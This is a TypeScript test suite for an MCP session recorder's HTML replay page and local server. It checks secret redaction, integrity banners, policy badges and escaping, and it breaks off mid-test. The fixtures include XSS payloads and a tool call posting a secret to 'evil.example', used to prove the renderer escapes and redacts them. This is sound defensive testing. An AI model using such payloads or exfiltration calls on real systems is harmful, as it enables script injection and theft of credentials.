import { describe, it, expect, beforeAll, afterAll } from 'vitest';
import { mkdtempSync, rmSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { GENESIS_HASH, makeRecord, sha256Ref } from '../src/chain/hash.js';
import { openStore } from '../src/store/index.js';
import { Redactor } from '../src/redact/redactor.js';
import { renderTimelineHtml, MAX_EMBED_EVENTS } from '../src/replay/render.js';
import { serveUi } from '../src/replay/serve.js';
import type { ChainHead, EvidenceStore, SessionSummary, VerifyResult } from '../src/types.js';
import type {
  AnyEvent,
  ChainRecord,
  IdentityContext,
  InitializeEvent,
  NotificationEvent,
  PolicyDecisionEvent,
  ProtocolErrorEvent,
  RpcEvent,
  ServerContext,
  SessionEndEvent,
  SessionStartEvent,
  ToolCallEvent,
} from '../src/schema/events.js';
import { SCHEMA } from '../src/schema/events.js';

/* ------------------------------ fixtures ------------------------------ */

const SECRET = 'sk-test-XYZ-12345678';
const CREDENTIAL = 'ghp_FAKEFAKEFAKEFAKEFAKE12';
const EVIL_TOOL = 'x<script>alert(1)</script>';

const SESSION_A = 'aaaaaaaa-aaaa-4aaa-8aaa-aaaaaaaaaaaa';
const SESSION_B = 'bbbbbbbb-bbbb-4bbb-8bbb-bbbbbbbbbbbb';

let eventCounter = 0;
function fakeUuid(): string {
  const n = (eventCounter++).toString(16).padStart(12, '0');
  return `00000000-0000-4000-8000-${n}`;
}

const IDENTITY: IdentityContext = {
  fingerprint: sha256Ref('jonirap|test-host|claude-code|1.2.3|ci'),
  os_user: 'jonirap',
  hostname: 'test-host',
  client_name: 'claude-code',
  client_version: '1.2.3',
  label: 'ci',
  credential_fingerprints: [{ name: 'GITHUB_TOKEN', ref: sha256Ref(CREDENTIAL) }],
};

const SERVER: ServerContext = {
  name: 'github-mcp',
  version: '2.1.0',
  command: 'npx -y @modelcontextprotocol/server-github',
  transport: 'stdio',
};

function base(sessionId: string, timestamp: string) {
  return {
    schema: SCHEMA,
    event_id: fakeUuid(),
    session_id: sessionId,
    timestamp,
    identity: IDENTITY,
    server: SERVER,
    attributes: {},
  } as const;
}

function sessionStart(sessionId: string, timestamp: string): SessionStartEvent {
  return {
    ...base(sessionId, timestamp),
    kind: 'session_start',
    proxy_version: '0.1.0',
    cwd: '/home/jonirap/project',
    redaction_mode: 'allowlist',
  };
}

function initialize(sessionId: string, timestamp: string): InitializeEvent {
  return {
    ...base(sessionId, timestamp),
    kind: 'initialize',
    request_id: 0,
    protocol_version: '2025-03-26',
    client_name: 'claude-code',
    client_version: '1.2.3',
    server_name: 'github-mcp',
    server_version: '2.1.0',
    duration_ms: 8,
  };
}

function toolCall(
  sessionId: string,
  timestamp: string,
  tool: string,
  rawArgs: unknown,
  opts: { isError?: boolean } = {},
): ToolCallEvent {
  const redactor = new Redactor();
  const isError = opts.isError ?? false;
  const event: ToolCallEvent = {
    ...base(sessionId, timestamp),
    kind: 'tool_call',
    attributes: { 'gen_ai.operation.name': 'execute_tool', 'gen_ai.tool.name': tool },
    tool,
    request_id: 1,
    args: redactor.scrub(rawArgs),
    result_hash: sha256Ref('{"ok":true}'),
    result: redactor.scrub({ content: [{ type: 'text', text: 'done' }] }),
    is_error: isError,
    duration_ms: 12.5,
  };
  if (isError) event.error = { code: -32000, type: 'ToolError', message_ref: sha256Ref('boom') };
  return event;
}

function rpc(sessionId: string, timestamp: string): RpcEvent {
  return {
    ...base(sessionId, timestamp),
    kind: 'rpc',
    method: 'tools/list',
    request_id: 2,
    params: {},
    result_hash: sha256Ref('{"tools":[]}'),
    is_error: false,
    duration_ms: 1.5,
  };
}

function notification(sessionId: string, timestamp: string): NotificationEvent {
  return {
    ...base(sessionId, timestamp),
    kind: 'notification',
    method: 'notifications/progress',
    direction: 'server_to_client',
    params: {},
  };
}

function protocolError(sessionId: string, timestamp: string): ProtocolErrorEvent {
  return {
    ...base(sessionId, timestamp),
    kind: 'protocol_error',
    direction: 'server_to_client',
    reason: 'unparseable',
    bytes_len: 132,
    line_hash: sha256Ref('not json at all'),
  };
}

function sessionEnd(sessionId: string, timestamp: string): SessionEndEvent {
  return {
    ...base(sessionId, timestamp),
    kind: 'session_end',
    reason: 'child_exit',
    child_exit_code: 0,
    events_recorded: 6,
    events_dropped: 0,
  };
}

function seal(events: AnyEvent[], head: ChainHead = { seq: 0, hash: GENESIS_HASH }): ChainRecord[] {
  const out: ChainRecord[] = [];
  let h = head;
  for (const event of events) {
    const record = makeRecord(h, event);
    out.push(record);
    h = { seq: record.seq, hash: record.hash };
  }
  return out;
}

function extractEmbeddedJson(html: string): unknown {
  const m = html.match(
    /<script type="application\/json" id="evidence-data">([\s\S]*?)<\/script>/,
  );
  expect(m).not.toBeNull();
  return JSON.parse(m![1]!);
}

interface EmbeddedData {
  truncated: boolean;
  sessions: Array<{ session_id: string }>;
  events: ChainRecord[];
}

/* -------------------------------- suite -------------------------------- */

describe('renderTimelineHtml', () => {
  let dir: string;
  let store: EvidenceStore;
  const totalEvents = 9;

  beforeAll(() => {
    dir = mkdtempSync(join(tmpdir(), 'mcp-recorder-replay-'));
    store = openStore({ dataDir: dir, backend: 'sqlite' });
    store.append(
      seal([
        sessionStart(SESSION_A, '2026-06-11T10:00:00.000Z'),
        initialize(SESSION_A, '2026-06-11T10:00:00.100Z'),
        toolCall(SESSION_A, '2026-06-11T10:00:01.000Z', 'create_issue', { api_key: SECRET }),
        rpc(SESSION_A, '2026-06-11T10:00:02.000Z'),
        notification(SESSION_A, '2026-06-11T10:00:03.000Z'),
        protocolError(SESSION_A, '2026-06-11T10:00:04.000Z'),
        sessionEnd(SESSION_A, '2026-06-11T10:00:05.000Z'),
        sessionStart(SESSION_B, '2026-06-11T11:00:00.000Z'),
        toolCall(SESSION_B, '2026-06-11T11:00:01.000Z', EVIL_TOOL, { q: 'x' }, { isError: true }),
      ]),
    );
  });

  afterAll(() => {
    store.close();
    rmSync(dir, { recursive: true, force: true });
  });

  it('renders a self-contained page with header, sessions, and tool names', () => {
    const html = renderTimelineHtml(store);
    expect(html).toContain('mcp-recorder — evidence replay');
    expect(html).toContain('evidence.db');
    expect(html).toContain(SESSION_A);
    expect(html).toContain(SESSION_B);
    expect(html).toContain('create_issue');
    // every event kind got a card/row
    for (const tag of ['SESSION START', 'SEE', 'ACT', 'EFFECT', 'RPC', 'NOTIFY', 'PROTOCOL', 'SESSION END']) {
      expect(html).toContain(tag);
    }
    // no external requests: no http(s) URLs in src/href attributes
    expect(html).not.toMatch(/(?:src|href)="https?:\/\//);
  });

  it('shows lock chips for redacted refs and never the raw secret', () => {
    const html = renderTimelineHtml(store);
    const ref = sha256Ref(SECRET);
    expect(html).toContain(`data-ref="${ref}"`);
    // short display form: sha256:<first 8 hex>…
    expect(html).toContain('sha256:' + ref.slice('sha256:'.length, 'sha256:'.length + 8));
    expect(html).toContain(`title="${ref} (len ${SECRET.length})"`);
    // the planted raw values must be absent
    expect(html).not.toContain(SECRET);
    expect(html).not.toContain(CREDENTIAL);
    // credential fingerprints render as chips too
    expect(html).toContain(`data-ref="${sha256Ref(CREDENTIAL)}"`);
  });

  it('escapes attacker-controlled strings (tool name script injection)', () => {
    const html = renderTimelineHtml(store);
    expect(html).not.toContain('<script>alert');
    expect(html).toContain('&lt;script&gt;alert(1)&lt;/script&gt;');
  });

  it('embeds parseable JSON that round-trips the events', () => {
    const html = renderTimelineHtml(store);
    const data = extractEmbeddedJson(html) as EmbeddedData;
    expect(data.truncated).toBe(false);
    expect(data.events).toHaveLength(totalEvents);
    expect(data.sessions.map((s) => s.session_id)).toEqual([SESSION_A, SESSION_B]);
    const evil = data.events.find(
      (r) => r.event.kind === 'tool_call' && r.event.tool === EVIL_TOOL,
    );
    expect(evil).toBeDefined();
    // the blob itself never contains a raw '<'
    const blob = html.match(
      /<script type="application\/json" id="evidence-data">([\s\S]*?)<\/script>/,
    )![1]!;
    expect(blob).not.toContain('<');
  });

  it('renders a single session when sessionId is given', () => {
    const html = renderTimelineHtml(store, { sessionId: SESSION_A });
    expect(html).toContain(SESSION_A);
    expect(html).not.toContain(SESSION_B);
    const data = extractEmbeddedJson(html) as EmbeddedData;
    expect(data.events).toHaveLength(7);
    expect(data.events.every((r) => r.event.session_id === SESSION_A)).toBe(true);
  });

  it('renders a notice for an unknown session', () => {
    const html = renderTimelineHtml(store, { sessionId: 'no-such-session' });
    expect(html).toContain('No events recorded for session');
  });

  it('shows a green integrity banner for a passing verify', () => {
    const head = store.head();
    const verify: VerifyResult = {
      ok: true,
      checked_events: totalEvents,
      head,
      problems: [],
      verified_signature: {
        seq: head.seq,
        chain_hash: head.hash,
        algo: 'ed25519',
        public_key: 'ab'.repeat(32),
        signature: 'cd'.repeat(64),
        signed_at: '2026-06-11T11:00:02.000Z',
      },
    };
    const html = renderTimelineHtml(store, { verify });
    expect(html).toContain('chain intact');
    expect(html).toContain(`${totalEvents} events`);
    expect(html).toContain('ab'.repeat(8)); // short pubkey (first 16 hex)
    expect(html).toContain('2026-06-11T11:00:02.000Z');
  });

  it('shows a red banner listing problems for a failing verify', () => {
    const verify: VerifyResult = {
      ok: false,
      checked_events: totalEvents,
      head: store.head(),
      problems: [
        { type: 'hash_mismatch', seq: 3, detail: 'record 3 was altered after sealing' },
      ],
    };
    const html = renderTimelineHtml(store, { verify });
    expect(html).toContain('FAILED');
    expect(html).toContain('hash_mismatch');
    expect(html).toContain('record 3 was altered after sealing');
  });

  it('includes the offline blast-radius box', () => {
    const html = renderTimelineHtml(store);
    expect(html).toContain('id="blast-form"');
    expect(html).toContain('id="blast-input"');
    expect(html).toContain('crypto.subtle.digest');
    expect(html).toContain('data-result-hash');
  });
});

describe('renderTimelineHtml truncation cap', () => {
  it(`caps embedded events at ${MAX_EMBED_EVENTS} with a visible notice`, () => {
    const dir = mkdtempSync(join(tmpdir(), 'mcp-recorder-replay-cap-'));
    const store = openStore({ dataDir: dir, backend: 'sqlite' });
    try {
      const events: AnyEvent[] = [sessionStart(SESSION_A, '2026-06-11T10:00:00.000Z')];
      for (let i = 0; i < MAX_EMBED_EVENTS + 100; i++) {
        events.push(notification(SESSION_A, '2026-06-11T10:00:01.000Z'));
      }
      store.append(seal(events));

      const html = renderTimelineHtml(store);
      expect(html).toContain('truncated');
      const data = extractEmbeddedJson(html) as EmbeddedData;
      expect(data.truncated).toBe(true);
      expect(data.events).toHaveLength(MAX_EMBED_EVENTS);
    } finally {
      store.close();
      rmSync(dir, { recursive: true, force: true });
    }
  });
});

describe('serveUi', () => {
  let dir: string;
  let store: EvidenceStore;

  beforeAll(() => {
    dir = mkdtempSync(join(tmpdir(), 'mcp-recorder-serve-'));
    store = openStore({ dataDir: dir, backend: 'sqlite' });
    store.append(
      seal([
        sessionStart(SESSION_A, '2026-06-11T10:00:00.000Z'),
        toolCall(SESSION_A, '2026-06-11T10:00:01.000Z', 'create_issue', { api_key: SECRET }),
        sessionEnd(SESSION_A, '2026-06-11T10:00:02.000Z'),
        sessionStart(SESSION_B, '2026-06-11T11:00:00.000Z'),
        toolCall(SESSION_B, '2026-06-11T11:00:01.000Z', 'send_email', { to: 'x' }),
      ]),
    );
  });

  afterAll(() => {
    store.close();
    rmSync(dir, { recursive: true, force: true });
  });

  it('serves the picker, per-session pages, and healthz on an ephemeral port', async () => {
    const handle = await serveUi({ store, port: 0 });
    try {
      expect(handle.port).toBeGreaterThan(0);
      expect(handle.url).toBe(`http://127.0.0.1:${handle.port}/`);

      const root = await fetch(handle.url);
      expect(root.status).toBe(200);
      expect(root.headers.get('content-type')).toContain('text/html');
      const rootHtml = await root.text();
      expect(rootHtml).toContain('mcp-recorder — evidence replay');
      expect(rootHtml).toContain(SESSION_A);
      expect(rootHtml).toContain(SESSION_B);

      const sessionRes = await fetch(`${handle.url}?session=${SESSION_A}`);
      expect(sessionRes.status).toBe(200);
      const sessionHtml = await sessionRes.text();
      expect(sessionHtml).toContain(SESSION_A);
      expect(sessionHtml).toContain('create_issue');
      expect(sessionHtml).not.toContain(SESSION_B);
      expect(sessionHtml).not.toContain(SECRET);

      const health = await fetch(`${handle.url}healthz`);
      expect(health.status).toBe(200);
      expect(await health.text()).toBe('ok');

      const missing = await fetch(`${handle.url}does-not-exist`);
      expect(missing.status).toBe(404);

      const post = await fetch(handle.url, { method: 'POST', body: 'nope' });
      expect(post.status).toBe(405);
    } finally {
      await handle.close();
    }
    // socket is really gone after close()
    await expect(fetch(handle.url)).rejects.toThrow();
  });

  it('uses opts.sessionId as the default page for GET /', async () => {
    const handle = await serveUi({ store, sessionId: SESSION_B });
    try {
      const res = await fetch(handle.url);
      expect(res.status).toBe(200);
      const html = await res.text();
      expect(html).toContain(SESSION_B);
      expect(html).toContain('send_email');
      expect(html).not.toContain(SESSION_A);
    } finally {
      await handle.close();
    }
  });

  it('close() resolves cleanly and is safe to await', async () => {
    const handle = await serveUi({ store });
    await expect(handle.close()).resolves.toBeUndefined();
  });
});

/* --------------------- P1: rpc/notification params visible -------------- */

describe('renderTimelineHtml renders rpc/notification params (P1 blast-radius gap)', () => {
  let dir: string;
  let store: EvidenceStore;
  const EMAIL_KEY = 'alice@corp.example.com';

  beforeAll(() => {
    dir = mkdtempSync(join(tmpdir(), 'mcp-recorder-replay-params-'));
    store = openStore({ dataDir: dir, backend: 'sqlite' });
    const redactor = new Redactor();
    const rpcWithParams: RpcEvent = {
      ...base(SESSION_A, '2026-06-11T10:00:02.000Z'),
      kind: 'rpc',
      method: 'resources/read',
      request_id: 9,
      params: redactor.scrub({ uri: SECRET, users: { [EMAIL_KEY]: { role: 'admin' } } }),
      result_hash: sha256Ref('{}'),
      is_error: false,
      duration_ms: 3,
    };
    const notifWithParams: NotificationEvent = {
      ...base(SESSION_A, '2026-06-11T10:00:03.000Z'),
      kind: 'notification',
      method: 'notifications/message',
      direction: 'server_to_client',
      params: redactor.scrub({ data: SECRET }),
    };
    store.append(seal([sessionStart(SESSION_A, '2026-06-11T10:00:00.000Z'), rpcWithParams, notifWithParams]));
  });

  afterAll(() => {
    store.close();
    rmSync(dir, { recursive: true, force: true });
  });

  it('an rpc params RedactedRef is present in the HTML as a matchable lock chip', () => {
    const html = renderTimelineHtml(store);
    expect(html).toContain(`data-ref="${sha256Ref(SECRET)}"`);
  });

  it('a hashed object KEY inside params is rendered with data-ref too', () => {
    const html = renderTimelineHtml(store);
    expect(html).toContain(`data-ref="${sha256Ref(EMAIL_KEY)}"`);
    expect(html).not.toContain(EMAIL_KEY);
  });
});

/* -------------------- P2: numeric-field interpolation is escaped --------- */

describe('render.ts escapes fields the TYPE SYSTEM merely claims are numeric', () => {
  const XSS = '1"><script>alert(1)</script>';

  /** A minimal EvidenceStore over hand-built (possibly type-lying) records —
   *  simulates reading back a tampered on-disk store, which JSON.parse
   *  happily deserializes without enforcing the declared TS types. */
  function mockStore(records: ChainRecord[]): EvidenceStore {
    return {
      backend: 'jsonl',
      path: '/fake/evidence.jsonl',
      head: () => ({ seq: records.length, hash: GENESIS_HASH }),
      append: () => undefined,
      // Read-only fake: `render` never writes, and a fake that silently
      // omitted this drifted out of the interface unnoticed for as long as
      // nothing typechecked this file.
      appendEvents: () => [],
      addSignature: () => undefined,
      latestSignature: () => null,
      signatures: () => [],
      iterate: () => records,
      count: () => records.length,
      sessions: (): SessionSummary[] => [],
      close: () => undefined,
    };
  }

  function record(event: AnyEvent): ChainRecord {
    return { seq: 1, prev_hash: GENESIS_HASH, hash: 'a'.repeat(64), event };
  }

  it('an rpc.duration_ms that is actually a string is escaped, not injected raw', () => {
    const evilEvent = {
      ...base(SESSION_A, '2026-06-11T10:00:00.000Z'),
      kind: 'rpc',
      method: 'tools/list',
      request_id: 1,
      params: {},
      result_hash: sha256Ref('{}'),
      is_error: false,
      duration_ms: XSS,
    } as unknown as RpcEvent;
    const html = renderTimelineHtml(mockStore([record(evilEvent)]), { sessionId: SESSION_A });
    expect(html).not.toContain('<script>alert(1)</script>');
    expect(html).toContain(escapeHtmlLike(XSS));
  });

  it('a protocol_error.bytes_len that is actually a string is escaped', () => {
    const evilEvent = {
      ...base(SESSION_A, '2026-06-11T10:00:00.000Z'),
      kind: 'protocol_error',
      direction: 'server_to_client',
      reason: 'oversized',
      bytes_len: XSS,
      line_hash: sha256Ref('x'),
    } as unknown as ProtocolErrorEvent;
    const html = renderTimelineHtml(mockStore([record(evilEvent)]), { sessionId: SESSION_A });
    expect(html).not.toContain('<script>alert(1)</script>');
    expect(html).toContain(escapeHtmlLike(XSS));
  });

  it('a session_end.events_recorded that is actually a string is escaped', () => {
    const evilEvent = {
      ...base(SESSION_A, '2026-06-11T10:00:00.000Z'),
      kind: 'session_end',
      reason: 'child_exit',
      child_exit_code: 0,
      events_recorded: XSS,
      events_dropped: 0,
    } as unknown as SessionEndEvent;
    const html = renderTimelineHtml(mockStore([record(evilEvent)]), { sessionId: SESSION_A });
    expect(html).not.toContain('<script>alert(1)</script>');
    expect(html).toContain(escapeHtmlLike(XSS));
  });

  it('a tampered seq (data-seq attribute context) is escaped, never breaks out of the attribute', () => {
    const evilEvent: NotificationEvent = {
      ...base(SESSION_A, '2026-06-11T10:00:00.000Z'),
      kind: 'notification',
      method: 'notifications/progress',
      direction: 'server_to_client',
      params: {},
    };
    const evilRecord = { ...record(evilEvent), seq: '1"><script>alert(1)</script>' } as unknown as ChainRecord;
    const html = renderTimelineHtml(mockStore([evilRecord]), { sessionId: SESSION_A });
    expect(html).not.toContain('<script>alert(1)</script>');
  });
});

/** Mirrors render.ts's private escapeHtml() so tests can assert the exact
 *  escaped form without exporting an internal. */
function escapeHtmlLike(s: string): string {
  return s
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#39;');
}

/* --------------------- gateway mode: policy_decision + badges --------------
 * A separate session (SESSION_C) in its own store, so the "7 events" count
 * for SESSION_A above stays valid.
 */

describe('renderTimelineHtml renders gateway-mode evidence (policy_decision rows, gateway badges)', () => {
  const SESSION_C = 'cccccccc-cccc-4ccc-8ccc-cccccccccccc';
  const BOUNDARY_SECRET = 'AKIAIOSFODNN7EXAMPLE';
  const APPROVAL_ID = '5d1c9e0a-1111-4222-8333-444444444444';
  const EVIL_RULE = 'r<img src=x onerror=alert(1)>';
  let dir: string;
  let store: EvidenceStore;

  function policyDecision(over: Partial<PolicyDecisionEvent>): PolicyDecisionEvent {
    return {
      ...base(SESSION_C, '2026-06-12T09:00:01.000Z'),
      kind: 'policy_decision',
      attributes: { 'gen_ai.tool.name': 'http_post', 'cresec.policy.decision': 'deny' },
      decision: 'deny',
      tool: 'http_post',
      request_id: 7,
      policy_hash: sha256Ref('policy bytes'),
      args_hash: sha256Ref('{"url":"https://evil.example"}'),
      ...over,
    };
  }

  beforeAll(() => {
    dir = mkdtempSync(join(tmpdir(), 'mcp-recorder-replay-gw-'));
    store = openStore({ dataDir: dir, backend: 'sqlite' });
    const redactor = new Redactor();
    const denied: ToolCallEvent = {
      ...toolCall(SESSION_C, '2026-06-12T09:00:01.500Z', 'http_post', { url: 'https://evil.example', body: SECRET }, { isError: true }),
      error: { type: 'policy_denied' },
      gateway: { decision: 'deny', rule_id: EVIL_RULE },
    };
    const heldThenFiltered: ToolCallEvent = {
      ...toolCall(SESSION_C, '2026-06-12T09:00:03.000Z', 'read_file', { path: 'secrets.env' }),
      result: redactor.scrub({ content: [{ type: 'text', text: `KEY=${BOUNDARY_SECRET}` }] }),
      gateway: {
        decision: 'hold',
        rule_id: 'careful',
        outcome: 'approved',
        approval_id: APPROVAL_ID,
        waited_ms: 1234,
        boundary: {
          scanned: true,
          action: 'redact',
          secrets_found: 2,
          injection_found: 1,
          secret_refs: [sha256Ref(BOUNDARY_SECRET)],
          delivered_result_hash: sha256Ref('delivered'),
        },
      },
    };
    const allowedClean: ToolCallEvent = {
      ...toolCall(SESSION_C, '2026-06-12T09:00:04.000Z', 'list_notes', {}),
      gateway: { decision: 'allow', boundary: { scanned: true, action: 'none', secrets_found: 0, injection_found: 0 } },
    };
    // A refused `tools/call` NOTIFICATION: the one decision that cannot be a
    // policy_decision event, so the timeline has to show it on the
    // notification itself or a reader cannot tell it from a forwarded one.
    const refusedNotification: NotificationEvent = {
      ...notification(SESSION_C, '2026-06-12T09:00:04.500Z'),
      method: 'tools/call',
      direction: 'client_to_server',
      gateway: { decision: 'deny', rule_id: 'no-delete' },
    };
    store.append(
      seal([
        sessionStart(SESSION_C, '2026-06-12T09:00:00.000Z'),
        policyDecision({ rule_id: EVIL_RULE }),
        denied,
        policyDecision({
          decision: 'hold',
          outcome: 'approved',
          tool: 'read_file',
          request_id: 8,
          rule_id: 'careful',
          approval_id: APPROVAL_ID,
          waited_ms: 1234,
          approver: 'joni',
        }),
        heldThenFiltered,
        allowedClean,
        refusedNotification,
        sessionEnd(SESSION_C, '2026-06-12T09:00:05.000Z'),
      ]),
    );
  });

  afterAll(() => {
    store.close();
    rmSync(dir, { recursive: true, force: true });
  });

  it('a policy_decision renders as a POLICY row with tool, decision badge, request id, rule, outcome and wait', () => {
    const html = renderTimelineHtml(store, { sessionId: SESSION_C });
    expect(html).toContain('tag-policy">POLICY</span>');
    expect(html).toContain('class="event row policy gw-deny"');
    expect(html).toContain('class="event row policy gw-hold"');
    expect(html).toContain('request 7');
    expect(html).toContain('request 8');
    expect(html).toContain('outcome approved');
    expect(html).toContain('waited 1234 ms');
    expect(html).toContain('rule careful');
    expect(html).toContain('by joni');
    // Both decisions here matched a rule, so the rule-less wording is absent.
    expect(html).not.toContain('no rule matched');
    expect(html).toContain(`<code>${APPROVAL_ID}</code>`);
    // args_hash is a traceable ref (blast-radius data-ref), never the args
    expect(html).toContain(`data-ref="${sha256Ref('{"url":"https://evil.example"}')}"`);
    expect(html).not.toContain('evil.example');
  });

  it('a refused tools/call NOTIFICATION carries its decision badge on the timeline', () => {
    // Enforcement happened; without the badge the row read as an ordinary
    // client notification and the refusal was visible only on stderr.
    const html = renderTimelineHtml(store, { sessionId: SESSION_C });
    const row = html.split('<article').find((a) => a.includes('row notif'))!;
    expect(row).toContain('<span class="badge gw gw-deny"');
    expect(row).toContain('gateway deny');
    expect(row).toContain('no-delete');
  });

  it('tool_call cards carry gw-allow / gw-hold / gw-deny badges and a boundary summary', () => {
    const html = renderTimelineHtml(store, { sessionId: SESSION_C });
    expect(html).toContain('<span class="badge gw gw-deny"');
    expect(html).toContain('<span class="badge gw gw-hold"');
    expect(html).toContain('<span class="badge gw gw-allow"');
    expect(html).toContain('gateway hold · approved');
    // The stored action is the MAX over both families: it is named once and
    // the counts follow it plainly, never as a per-family verb (B1).
    expect(html).toContain('redact · 2 secrets · 1 injection marker');
    expect(html).not.toContain('redacted 1 injection marker');
    expect(html).toContain('scanned · 0 findings');
    // the redacted secret is findable by the client-side blast search, never readable
    expect(html).toContain(`data-secret-refs="${sha256Ref(BOUNDARY_SECRET)}"`);
    expect(html).not.toContain(BOUNDARY_SECRET);
    expect(html).not.toContain(SECRET);
    expect(html).toContain(`delivered result ${sha256Ref('delivered')}`);
  });

  it('a HOOK deny (a `pre` tool_call with error.type policy_denied, no gateway field) carries the same red gw-deny badge', () => {
    // One deny event shape [z8n6b5z1zr]: the hook records a deny as the
    // call's own pre event, and until now the timeline showed it with only
    // the generic `error` badge, so nothing said "policy" — a reader could
    // not tell a hook deny from a tool that merely failed.
    const hookDir = mkdtempSync(join(tmpdir(), 'mcp-recorder-replay-hook-'));
    const hookStore = openStore({ dataDir: hookDir, backend: 'sqlite' });
    try {
      const SESSION_H = 'dddddddd-dddd-4ddd-8ddd-dddddddddddd';
      const denied: ToolCallEvent = {
        ...toolCall(SESSION_H, '2026-06-12T10:00:01.000Z', 'clickup_delete_task', { task_id: 'abc' }, { isError: true }),
        source: 'hook',
        phase: 'pre',
        error: { type: 'policy_denied', message_ref: sha256Ref('denied by policy') },
      };
      const failed: ToolCallEvent = {
        ...toolCall(SESSION_H, '2026-06-12T10:00:02.000Z', 'clickup_get_task', { task_id: 'abc' }, { isError: true }),
        source: 'hook',
        phase: 'post',
        error: { type: 'tool_error', message_ref: sha256Ref('boom') },
      };
      hookStore.append(seal([sessionStart(SESSION_H, '2026-06-12T10:00:00.000Z'), denied, failed]));
      const html = renderTimelineHtml(hookStore, { sessionId: SESSION_H });
      const cards = html.split('<article');
      const deniedCard = cards.find((c) => c.includes('clickup_delete_task'))!;
      expect(deniedCard).toContain('<span class="badge gw gw-deny"');
      expect(deniedCard).toContain('hook deny');
      // NEGATIVE CONTROL (in-suite): an ordinary failed hook call gets the
      // generic error badge and nothing that says "policy".
      const failedCard = cards.find((c) => c.includes('clickup_get_task'))!;
      expect(failedCard).toContain('<span class="badge err">error</span>');
      expect(failedCard).not.toContain('gw-deny');
      expect(failedCard).not.toContain('hook deny');
    } finally {
      hookStore.close();
      rmSync(hookDir, { recursive: true, force: true });
    }
  });

  it('escapes an attacker-shaped rule id everywhere it appears', () => {
    const html = renderTimelineHtml(store, { sessionId: SESSION_C });
    expect(html).not.toContain('<img src=x');
    expect(html).toContain(escapeHtmlLike(EVIL_RULE));
  });

  it('the page still lists every other kind (the new row is additive)', () => {
    const html = renderTimelineHtml(store, { sessionId: SESSION_C });
    for (const tag of ['SESSION START', 'ACT', 'EFFECT', 'POLICY', 'NOTIFY', 'SESSION END']) {
      expect(html).toContain(tag);
    }
    const data = extractEmbeddedJson(html) as EmbeddedData;
    expect(data.events).toHaveLength(8);
    expect(data.events.filter((r) => r.event.kind === 'policy_decision')).toHaveLength(2);
  });

  it('numeric-typed gateway fields that are actually strings are escaped (tampered store)', () => {
    const XSS = '1"><script>alert(1)</script>';
    const evilDecision = policyDecision({ decision: 'hold', outcome: 'timeout', waited_ms: XSS as unknown as number });
    const evilCall = {
      ...toolCall(SESSION_C, '2026-06-12T09:00:02.000Z', 'read_file', {}),
      gateway: { decision: 'allow', boundary: { scanned: true, action: 'flag', secrets_found: XSS, injection_found: 0 } },
    } as unknown as ToolCallEvent;
    const records = seal([evilDecision, evilCall]);
    const fake: EvidenceStore = {
      backend: 'jsonl',
      path: '/fake/evidence.jsonl',
      head: () => ({ seq: records.length, hash: GENESIS_HASH }),
      append: () => undefined,
      // Read-only fake: `render` never writes, and a fake that silently
      // omitted this drifted out of the interface unnoticed for as long as
      // nothing typechecked this file.
      appendEvents: () => [],
      addSignature: () => undefined,
      latestSignature: () => null,
      signatures: () => [],
      iterate: () => records,
      count: () => records.length,
      sessions: (): SessionSummary[] => [],
      close: () => undefined,
    };
    const html = renderTimelineHtml(fake, { sessionId: SESSION_C });
    expect(html).not.toContain('<script>alert(1)</script>');
    expect(html).toContain(escapeHtmlLike(XSS));
  });
});

/* -------- B1/B2: the gateway badge and the POLICY row state facts only ----
 * BoundaryReport.action is the MAXIMUM over the secrets and injection
 * families, so it cannot be spoken as a verb over each count; and a
 * policy_decision without rule_id is not proof that the configured default
 * applied (fail-closed evaluation-error denies omit it too).
 */

describe('gateway badge and POLICY row never over-claim (B1, B2)', () => {
  const SESSION_D = 'dddddddd-dddd-4ddd-8ddd-dddddddddddd';

  function fakeStore(records: ChainRecord[]): EvidenceStore {
    return {
      backend: 'jsonl',
      path: '/fake/evidence.jsonl',
      head: () => ({ seq: records.length, hash: GENESIS_HASH }),
      append: () => undefined,
      appendEvents: () => [],
      addSignature: () => undefined,
      latestSignature: () => null,
      signatures: () => [],
      iterate: () => records,
      count: () => records.length,
      sessions: (): SessionSummary[] => [],
      close: () => undefined,
    };
  }

  /** The gateway badge text for one BoundaryReport, rendered through the real page. */
  function badge(boundary: unknown, decision: 'allow' | 'deny' | 'hold' = 'allow'): string {
    const call = {
      ...toolCall(SESSION_D, '2026-06-13T10:00:00.000Z', 'read_file', { path: 'x' }),
      gateway: { decision, boundary },
    } as unknown as ToolCallEvent;
    const html = renderTimelineHtml(fakeStore(seal([sessionStart(SESSION_D, '2026-06-13T09:59:59.000Z'), call])), {
      sessionId: SESSION_D,
    });
    const m = /<span class="badge boundary[^"]*"[^>]*>([^<]*)<\/span>/.exec(html);
    if (m === null) throw new Error(`no boundary badge in:\n${html}`);
    return m[1]!;
  }

  it('names the stored action once and then plain counts (the default policy redacts secrets, only flags injection)', () => {
    // The exact shape the finding is about: action 'redact' is the max over
    // both families, and the injection marker was only flagged.
    expect(badge({ scanned: true, action: 'redact', secrets_found: 1, injection_found: 1 })).toBe(
      'redact · 1 secret · 1 injection marker',
    );
    expect(badge({ scanned: true, action: 'redact', secrets_found: 2, injection_found: 3 })).toBe(
      'redact · 2 secrets · 3 injection markers',
    );
    // No verb is ever attached to the injection count.
    for (const n of [1, 3]) expect(badge({ scanned: true, action: 'redact', secrets_found: 1, injection_found: n })).not.toContain('redacted');
  });

  it('renders each action honestly: flag, block, none, and a count of only one family', () => {
    expect(badge({ scanned: true, action: 'flag', secrets_found: 0, injection_found: 2 })).toBe('flag · 2 injection markers');
    expect(badge({ scanned: true, action: 'flag', secrets_found: 1, injection_found: 0 })).toBe('flag · 1 secret');
    // 'block' is the one action that legitimately covers everything: the
    // whole result was replaced, so both families really were blocked.
    expect(badge({ scanned: true, action: 'block', secrets_found: 1, injection_found: 1 }, 'deny')).toBe(
      'blocked · 1 secret · 1 injection marker',
    );
    expect(badge({ scanned: true, action: 'none', secrets_found: 0, injection_found: 0 })).toBe('scanned · 0 findings');
    // A scan that found nothing never claims an action it did not take.
    expect(badge({ scanned: true, action: 'none', secrets_found: 0, injection_found: 0 })).not.toContain('redact');
  });

  it('a block badge carries the deny styling', () => {
    const call = {
      ...toolCall(SESSION_D, '2026-06-13T10:00:00.000Z', 'read_file', { path: 'x' }),
      gateway: { decision: 'allow', boundary: { scanned: true, action: 'block', secrets_found: 1, injection_found: 0 } },
